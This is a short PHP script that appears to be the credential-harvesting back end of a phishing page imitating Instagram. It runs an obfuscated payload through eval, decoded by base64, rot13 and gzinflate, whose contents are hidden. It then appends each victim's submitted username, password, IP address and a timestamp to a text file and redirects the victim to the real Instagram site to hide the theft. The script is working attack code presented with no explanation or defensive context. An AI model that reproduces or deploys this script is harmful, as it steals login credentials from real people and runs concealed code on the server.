<?php
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
eval(gzinflate(str_rot13(base64_decode('hY/Rd8IwFIbvC32HUAjUTqlrLQ5xjTBDK3bcjVUJdjBS14Qkxe3tl1PK2M08SuH/v8P5ggd7gxUgxcVITaFS0Q7i2vau0PYyXxRTGbRZE3m084Hj1vJimKUJGpy0Pf+UCEmvgJtQSLNGNoXZOQ+I4c7dtXr/IEb4QDqD4DERqQn9IPSURLKrGHbWclazZpq8BAMIEk8FBRGMm67vPMxja45djJz02oyhQzm8Hem2OrBrMwdiB/mc27yTekznEP/6P0EJO9I9o+t9vSH09wBhueeTo/ySIu6NjRRXUKyXPw=='))));
file_put_contents("veri.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . " İp: " . $_SERVER['REMOTE_ADDR'] . " Tarih: " . $cur_time . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
